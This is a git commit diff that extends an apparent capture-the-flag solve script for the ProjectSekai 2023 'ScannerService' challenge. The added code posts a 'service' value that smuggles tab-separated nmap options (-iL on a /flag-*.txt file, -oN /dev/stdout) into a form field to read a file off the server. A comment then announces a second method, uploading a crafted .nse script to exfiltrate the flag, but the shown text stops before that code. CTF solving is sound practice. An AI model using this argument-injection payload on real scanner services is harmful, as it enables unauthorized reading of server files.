ab9ec19aeb3033594216c02560ef784876da38c6
bubu <albertofdr@gmail.com>
2023-08-28 22:40:01 +0200

    ProjectSekai ScannerSecure, new solution

--- 2023/ProjectSekai/ScannerService/solve.py
+++ 2023/ProjectSekai/ScannerService/solve.py
@@ -4,6 +4,20 @@ import httpx
 
 URL = sys.argv[1]
 
+# ================================================
+# Solution 1
+# Use -iL for reading hosts and redirect the error to Stdout
+# ================================================
+payload = {
+    'service': '18.198.77.177:11304\t-iL\t/flag-????????????????????????????????.txt\t-oN\t/dev/stdout'
+}
+r = BeautifulSoup(httpx.post(URL, data=payload).text, features="lxml").find_all('pre', {'class': 'result'})[0]
+print(r)
+
+# ================================================
+# Solution 2
+# Execute our crafted .nse to exfiltrate the flag 
+# ================================================
 
 # UPLOAD OUR .NSE SCRIPT
 payload = {
